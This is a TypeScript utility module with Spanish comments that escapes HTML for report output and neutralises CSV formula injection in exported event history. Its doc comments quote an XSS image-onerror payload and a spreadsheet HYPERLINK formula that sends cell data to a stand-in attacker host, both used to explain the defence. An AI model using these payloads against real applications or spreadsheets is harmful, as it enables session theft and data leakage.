// src/lib/sanitize.ts
// Utilidades de saneamiento de datos que salen de la aplicación hacia
// contextos donde el texto se interpreta: HTML de los informes y CSV.
//
// Los campos `nombre` y `motivo` de un evento provienen del registro de
// usuarios y del nodo edge respectivamente: nunca deben tratarse como
// contenido de confianza.

/** Caracteres con significado sintáctico en HTML y su entidad equivalente. */
const HTML_ENTITIES: Record<string, string> = {
  "&": "&amp;",
  "<": "&lt;",
  ">": "&gt;",
  '"': "&quot;",
  "'": "&#39;",
};

/**
 * Escapa texto para insertarlo de forma segura dentro de un documento HTML.
 *
 * Sin esto, un usuario registrado con un nombre como
 * `<img src=x onerror=alert(1)>` ejecutaría código al generar el informe
 * del evento: la ventana del informe se abre con window.open("") y hereda
 * el origen de la aplicación, por lo que ese script tendría acceso a la
 * sesión de Supabase.
 *
 * @param value Texto de origen no confiable (puede ser null/undefined).
 * @returns El texto con los caracteres peligrosos convertidos en entidades.
 */
export function escapeHtml(value: unknown): string {
  if (value === null || value === undefined) return "";
  return String(value).replace(/[&<>"']/g, (char) => HTML_ENTITIES[char]);
}

/**
 * Caracteres que, al inicio de una celda, hacen que Excel, LibreOffice o
 * Google Sheets interpreten el contenido como fórmula en lugar de texto.
 */
const CSV_FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Neutraliza la inyección de fórmulas en CSV (CSV / Formula Injection).
 *
 * Una celda que empieza por `=`, `+`, `-` o `@` es ejecutada por la hoja de
 * cálculo al abrir el archivo. Un evento cuyo `nombre` fuera
 * `=HYPERLINK("http://atacante/"&A1)` filtraría datos en cuanto un
 * administrador abriese el historial exportado.
 *
 * La mitigación estándar (OWASP) es anteponer un apóstrofo, que las hojas
 * de cálculo tratan como "el resto es texto literal" y no muestran.
 *
 * @param value Valor de la celda ya convertido a texto.
 * @returns El valor, prefijado con `'` si podía interpretarse como fórmula.
 */
export function sanitizeCsvValue(value: string): string {
  if (!value) return value;
  if (!CSV_FORMULA_TRIGGERS.includes(value[0])) return value;

  // Un número negativo (-0.87, -12) empieza por "-" pero no es una fórmula:
  // prefijarlo lo convertiría en texto y corrompería la columna.
  if (/^-?\d+(\.\d+)?$/.test(value)) return value;

  return `'${value}`;
}

/**
 * Convierte un valor arbitrario en una celda CSV completa: serializa
 * objetos, neutraliza fórmulas, escapa comillas y envuelve en comillas.
 */
export function toCsvCell(value: unknown): string {
  const raw =
    value !== null && typeof value === "object"
      ? JSON.stringify(value)
      : String(value ?? "");

  return `"${sanitizeCsvValue(raw).replace(/"/g, '""')}"`;
}
